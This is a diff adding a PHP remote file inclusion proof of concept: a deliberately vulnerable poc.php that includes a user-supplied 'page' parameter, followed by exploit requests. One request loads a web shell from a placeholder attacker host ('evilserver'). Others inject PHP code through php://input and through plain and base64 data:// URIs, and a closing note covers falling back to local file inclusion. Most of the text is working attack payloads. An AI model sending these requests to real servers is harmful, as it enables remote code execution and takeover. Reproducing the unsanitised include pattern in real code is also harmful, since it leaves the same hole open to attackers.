@@ -1,0 +1,31 @@
+Env:
+allow_url_fopen = On
+allow_url_include = On
+
+
+poc.php
+<?php
+  include $_GET['page'].'.php';
+?>
+
+Way 1:
+Env: Server can visit the Internet
+  GET http://127.0.0.1/poc.php?page=http://evilserver/webshell.txt?
+
+Way 2:
+Env: Server can not visit the Internet
+
+  GET  http://127.0.0.1/poc.php?page=php://input
+  POST <?php phpinfo();?>
+
+  or
+  
+  GET  http://127.0.0.1/poc.php?page=data://text/plain,<?php phpinfo();?>
+  
+  or
+  
+  GET  http://127.0.0.1/poc.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+  
+Way 3:
+Solve it as LFI.
+If GPC = On or PHP version >= 5.3.4, null byte can not work, do it as LFI is not good!
